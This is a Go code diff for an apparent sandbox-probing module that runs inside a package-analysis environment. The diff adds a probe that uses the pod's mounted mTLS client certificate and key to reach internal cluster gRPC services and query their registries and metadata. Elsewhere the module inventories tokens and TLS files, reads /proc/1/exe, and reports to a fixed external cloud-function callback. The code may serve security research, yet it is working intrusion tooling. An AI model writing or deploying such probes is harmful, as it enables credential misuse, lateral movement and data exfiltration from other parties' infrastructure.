@@ -7,6 +7,8 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
@@ -31,11 +33,11 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.128-pacman-map-codex"
-	expectedAgent      = "go-cgo-pkgsite-probe-v128-pacman-map"
+	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.129-pacman-gate-codex"
+	expectedAgent      = "go-cgo-pkgsite-probe-v129-pacman-gate"
 	httpTimeout        = 15 * time.Second
 	sessionLength      = 10 * time.Minute
-	maximumSteps       = 4
+	maximumSteps       = 3
 	maximumBody        = 48 * 1024
 	maximumRead        = 256 * 1024
 	maximumPath        = 512
@@ -48,7 +50,24 @@ const (
 	maximumFields      = 1024
 	maximumSchemaBytes = 32 * 1024
 	descriptorScanTime = 20 * time.Second
+	internalPort       = 9000
+	internalTimeout    = 12 * time.Second
+	tlsServerName      = "localhost"
+	clientCertPath     = "/etc/tls/client/tls.crt"
+	clientKeyPath      = "/etc/tls/client/tls.key"
+	serverPoolPath     = "/etc/tls/server-pool/server-tls-pool.pem"
+	listRegistriesRPC  = "/sos.pacman.Pacman/ListRegistries"
+	metadataRPC        = "/sos.pacman.Pacman/Metadata"
+	ownedTargetName    = "github.com/benr00t3d/go-byteman-crosswrite-canary"
+	ownedTargetVersion = "v0.0.8"
 )
+
+var pacmanCandidates = []string{
+	"pacman-core.default.svc.cluster.local",
+	"pacman.default.svc.cluster.local",
+	"pacman-api.default.svc.cluster.local",
+	"talisman-core.default.svc.cluster.local",
+}
 
 var fixedPaths = []string{
 	expectedOrigin,
@@ -371,6 +390,39 @@ type serviceLiteralReport struct {
 	Truncated       bool     `json:"truncated"`
 }
 
+type grpcReadReceipt struct {
+	Attempted      bool     `json:"attempted"`
+	Method         string   `json:"method"`
+	RequestBytes   int      `json:"request_bytes"`
+	RequestSHA256  string   `json:"request_sha256"`
+	HTTPStatus     int      `json:"http_status"`
+	ContentType    string   `json:"content_type"`
+	GRPCStatus     int      `json:"grpc_status"`
+	ResponseFrames int      `json:"response_frames"`
+	ResponseBytes  int      `json:"response_bytes"`
+	ResponseSHA256 string   `json:"response_sha256"`
+	Registries     []string `json:"registries"`
+	TargetVersion  bool     `json:"target_version"`
+	TransportOK    bool     `json:"transport_ok"`
+	ApplicationOK  bool     `json:"application_ok"`
+	Error          string   `json:"error"`
+}
+
+type pacmanCandidateReceipt struct {
+	Host             string          `json:"host"`
+	Resolved         bool            `json:"resolved"`
+	PrivateAddresses int             `json:"private_addresses"`
+	ListRegistries   grpcReadReceipt `json:"list_registries"`
+	Metadata         grpcReadReceipt `json:"metadata"`
+}
+
+type pacmanReadOnlyReport struct {
+	Target     string                   `json:"target"`
+	System     int                      `json:"system"`
+	Candidates []pacmanCandidateReceipt `json:"candidates"`
+	Verified   bool                     `json:"verified"`
+}
+
 type wireField struct {
 	number int
 	wire   int
@@ -490,7 +542,7 @@ func podFingerprint() string {
 }
 
 func initialTranscript(fingerprint string) string {
-	digest := sha256.Sum256([]byte("owned-go-capslock-v128-pacman-map/1\n" + fingerprint))
+	digest := sha256.Sum256([]byte("owned-go-capslock-v129-pacman-gate/1\n" + fingerprint))
 	return hex.EncodeToString(digest[:])
 }
 
@@ -595,6 +647,8 @@ func executeProbe(request requestSpec, state *clientState, sequence int) (any, s
 		value, err = collectProtoSchemas("/proc/1/exe", request.Args["package"])
 	case "service_literals":
 		value, err = collectServiceLiterals("/proc/1/exe")
+	case "pacman_readonly":
+		value, err = collectPacmanReadOnly()
 	case "path_meta":
 		value, err = collectPathMetadata(request.Args["path"])
 	case "dir_meta":
@@ -640,7 +694,7 @@ func validRequestShape(request requestSpec, workspace string) bool {
 		"interfaces": true, "dns_summary": true, "egress_receipt": true,
 		"security_status": true, "pid1_cmdline": true, "cgroup_hints": true,
 		"projected_token_inventory": true, "tls_inventory": true, "protobuf_services": true,
-		"protobuf_schemas": true, "service_literals": true,
+		"protobuf_schemas": true, "service_literals": true, "pacman_readonly": true,
 	}
 	if noArguments[request.ID] {
 		return len(request.Args) == 0
@@ -1084,7 +1138,7 @@ func runWriteCanary(base string, state *clientState, sequence int) (map[string]a
 	if _, err := rand.Read(random[:]); err != nil {
 		return nil, err
 	}
-	basename := ".go-cgo-v128-pacman-map-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
+	basename := ".go-cgo-v129-pacman-gate-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
 	path := filepath.Join(base, basename)
 	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
 	if err != nil {
@@ -2020,6 +2074,276 @@ func collectServiceLiterals(path string) (serviceLiteralReport, error) {
 	return report, nil
 }
 
+func appendWireVarint(target []byte, value uint64) []byte {
+	var buffer [10]byte
+	length := binary.PutUvarint(buffer[:], value)
+	return append(target, buffer[:length]...)
+}
+
+func appendProtoVarintField(target []byte, number int, value uint64) []byte {
+	target = appendWireVarint(target, uint64(number<<3))
+	return appendWireVarint(target, value)
+}
+
+func appendProtoBytesField(target []byte, number int, value []byte) []byte {
+	target = appendWireVarint(target, uint64(number<<3|2))
+	target = appendWireVarint(target, uint64(len(value)))
+	return append(target, value...)
+}
+
+func appendProtoStringField(target []byte, number int, value string) []byte {
+	return appendProtoBytesField(target, number, []byte(value))
+}
+
+func grpcFrame(payload []byte) []byte {
+	result := make([]byte, 5, 5+len(payload))
+	binary.BigEndian.PutUint32(result[1:], uint32(len(payload)))
+	return append(result, payload...)
+}
+
+func grpcFrames(body []byte) ([][]byte, bool) {
+	result := [][]byte{}
+	for offset := 0; offset < len(body); {
+		if len(result) == 16 || len(body)-offset < 5 || body[offset] != 0 {
+			return nil, false
+		}
+		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
+		offset += 5
+		if length < 0 || length > len(body)-offset {
+			return nil, false
+		}
+		result = append(result, body[offset:offset+length])
+		offset += length
+	}
+	return result, len(result) > 0
+}
+
+func grpcStatus(response *http.Response) int {
+	value := response.Trailer.Get("Grpc-Status")
+	if value == "" {
+		value = response.Header.Get("Grpc-Status")
+	}
+	if value == "" || len(value) > 2 {
+		return -1
+	}
+	status, err := strconv.Atoi(value)
+	if err != nil || status < 0 || status > 16 {
+		return -1
+	}
+	return status
+}
+
+func resolvePrivateService(host string) (net.IP, int) {
+	ctx, cancel := context.WithTimeout(context.Background(), 4*time.Second)
+	defer cancel()
+	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, host)
+	if err != nil {
+		return nil, 0
+	}
+	var selected net.IP
+	count := 0
+	for _, candidate := range addresses {
+		if !candidate.IP.IsPrivate() || candidate.IP.IsUnspecified() || candidate.IP.IsMulticast() {
+			continue
+		}
+		count++
+		if selected == nil {
+			selected = candidate.IP
+		}
+	}
+	return selected, count
+}
+
+func verifyInternalPeer(state tls.ConnectionState, roots *x509.CertPool) error {
+	if len(state.PeerCertificates) == 0 {
+		return errors.New("peer certificate missing")
+	}
+	leaf := state.PeerCertificates[0]
+	intermediates := x509.NewCertPool()
+	for _, certificate := range state.PeerCertificates[1:] {
+		intermediates.AddCert(certificate)
+	}
+	if _, err := leaf.Verify(x509.VerifyOptions{
+		Roots: roots, Intermediates: intermediates,
+		KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+	}); err != nil {
+		return err
+	}
+	if len(leaf.DNSNames) > 0 {
+		return leaf.VerifyHostname(tlsServerName)
+	}
+	if leaf.Subject.CommonName != tlsServerName {
+		return errors.New("peer identity mismatch")
+	}
+	return nil
+}
+
+func internalClient(host string, address net.IP) (*http.Client, error) {
+	certificate, err := tls.LoadX509KeyPair(clientCertPath, clientKeyPath)
+	if err != nil {
+		return nil, err
+	}
+	pemBytes, err := readBounded(serverPoolPath, 64*1024)
+	if err != nil {
+		return nil, err
+	}
+	roots := x509.NewCertPool()
+	if !roots.AppendCertsFromPEM(pemBytes) {
+		return nil, errors.New("root pool empty")
+	}
+	dialAddress := net.JoinHostPort(address.String(), strconv.Itoa(internalPort))
+	dialer := &net.Dialer{Timeout: 8 * time.Second, KeepAlive: -1}
+	tlsConfig := &tls.Config{
+		Certificates: []tls.Certificate{certificate}, RootCAs: roots,
+		MinVersion: tls.VersionTLS12, ServerName: tlsServerName, InsecureSkipVerify: true,
+		VerifyConnection: func(state tls.ConnectionState) error { return verifyInternalPeer(state, roots) },
+	}
+	transport := &http.Transport{
+		Proxy: nil, ForceAttemptHTTP2: true, TLSClientConfig: tlsConfig,
+		DisableKeepAlives: true, TLSHandshakeTimeout: 8 * time.Second,
+		ResponseHeaderTimeout: 8 * time.Second,
+		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
+			return dialer.DialContext(ctx, network, dialAddress)
+		},
+	}
+	return &http.Client{
+		Transport: transport, Timeout: internalTimeout,
+		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return errors.New("redirect denied") },
+	}, nil
+}
+
+func parseRegistries(frames [][]byte) []string {
+	result := []string{}
+	for _, frame := range frames {
+		fields, ok := protobufFields(frame)
+		if !ok {
+			continue
+		}
+		for _, field := range fields {
+			if field.number != 1 || field.wire != 2 || !utf8.Valid(field.value) || len(field.value) == 0 || len(field.value) > 128 {
+				continue
+			}
+			value := sanitizeText(string(field.value), 128)
+			if value != "" {
+				result = appendUnique(result, value, 16)
+			}
+		}
+	}
+	sort.Strings(result)
+	return result
+}
+
+func metadataContainsVersion(frames [][]byte) bool {
+	for _, frame := range frames {
+		fields, ok := protobufFields(frame)
+		if !ok {
+			continue
+		}
+		for _, field := range fields {
+			if field.number == 8 && field.wire == 2 && string(field.value) == ownedTargetVersion {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+func runGRPCRead(host string, address net.IP, method string, payload []byte) grpcReadReceipt {
+	body := grpcFrame(payload)
+	digest := sha256.Sum256(body)
+	receipt := grpcReadReceipt{
+		Attempted: true, Method: method, RequestBytes: len(body),
+		RequestSHA256: hex.EncodeToString(digest[:]), GRPCStatus: -1,
+		Registries: []string{},
+	}
+	client, err := internalClient(host, address)
+	if err != nil {
+		receipt.Error = "internal_client_failed"
+		return receipt
+	}
+	defer client.CloseIdleConnections()
+	ctx, cancel := context.WithTimeout(context.Background(), internalTimeout)
+	defer cancel()
+	endpoint := "https://" + net.JoinHostPort(host, strconv.Itoa(internalPort)) + method
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(body))
+	if err != nil {
+		receipt.Error = "request_failed"
+		return receipt
+	}
+	request.Header.Set("Content-Type", "application/grpc")
+	request.Header.Set("TE", "trailers")
+	request.Header.Set("Grpc-Timeout", "10S")
+	request.Header.Set("User-Agent", expectedAgent)
+	response, err := client.Do(request)
+	if err != nil {
+		receipt.Error = "transport_failed"
+		return receipt
+	}
+	defer response.Body.Close()
+	receipt.HTTPStatus = response.StatusCode
+	receipt.ContentType = sanitizeText(response.Header.Get("Content-Type"), 64)
+	responseBody, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
+	if err != nil || len(responseBody) > 64*1024 {
+		receipt.Error = "response_invalid"
+		return receipt
+	}
+	receipt.GRPCStatus = grpcStatus(response)
+	receipt.ResponseBytes = len(responseBody)
+	responseDigest := sha256.Sum256(responseBody)
+	receipt.ResponseSHA256 = hex.EncodeToString(responseDigest[:])
+	frames, complete := grpcFrames(responseBody)
+	if complete {
+		receipt.ResponseFrames = len(frames)
+	}
+	receipt.TransportOK = response.StatusCode == http.StatusOK &&
+		strings.HasPrefix(strings.ToLower(response.Header.Get("Content-Type")), "application/grpc") && complete
+	receipt.ApplicationOK = receipt.TransportOK && receipt.GRPCStatus == 0
+	if receipt.ApplicationOK {
+		switch method {
+		case listRegistriesRPC:
+			receipt.Registries = parseRegistries(frames)
+		case metadataRPC:
+			receipt.TargetVersion = metadataContainsVersion(frames)
+		}
+	} else {
+		receipt.Error = "grpc_not_ok"
+	}
+	return receipt
+}
+
+func collectPacmanReadOnly() (pacmanReadOnlyReport, error) {
+	report := pacmanReadOnlyReport{
+		Target: ownedTargetName + "@" + ownedTargetVersion,
+		System: 1, Candidates: []pacmanCandidateReceipt{},
+	}
+	registriesPayload := appendProtoVarintField(nil, 1, 1)
+	metadataPayload := appendProtoStringField(nil, 1, ownedTargetName)
+	metadataPayload = appendProtoStringField(metadataPayload, 2, ownedTargetVersion)
+	metadataPayload = appendProtoVarintField(metadataPayload, 3, 1)
+	for _, host := range pacmanCandidates {
+		candidate := pacmanCandidateReceipt{
+			Host:           host,
+			ListRegistries: grpcReadReceipt{Method: listRegistriesRPC, GRPCStatus: -1, Registries: []string{}},
+			Metadata:       grpcReadReceipt{Method: metadataRPC, GRPCStatus: -1, Registries: []string{}},
+		}
+		address, count := resolvePrivateService(host)
+		candidate.PrivateAddresses = count
+		candidate.Resolved = address != nil
+		if candidate.Resolved {
+			candidate.ListRegistries = runGRPCRead(host, address, listRegistriesRPC, registriesPayload)
+			if candidate.ListRegistries.ApplicationOK {
+				candidate.Metadata = runGRPCRead(host, address, metadataRPC, metadataPayload)
+			}
+		}
+		report.Candidates = append(report.Candidates, candidate)
+		if candidate.Metadata.ApplicationOK && candidate.Metadata.TargetVersion {
+			report.Verified = true
+			break
+		}
+	}
+	return report, nil
+}
+
 func collectProtoServices(path string) (protoServiceReport, error) {
 	file, err := os.Open(path)
 	if err != nil {
@@ -2123,7 +2447,7 @@ func validateRuntimeConfiguration() error {
 	parsed, err := url.Parse(callbackURL)
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-v128-pacman-map-codex/v1/session/"+callbackSession {
+		parsed.Path != "/go-cgo-v129-pacman-gate-codex/v1/session/"+callbackSession {
 		return errors.New("invalid fixed callback URL")
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
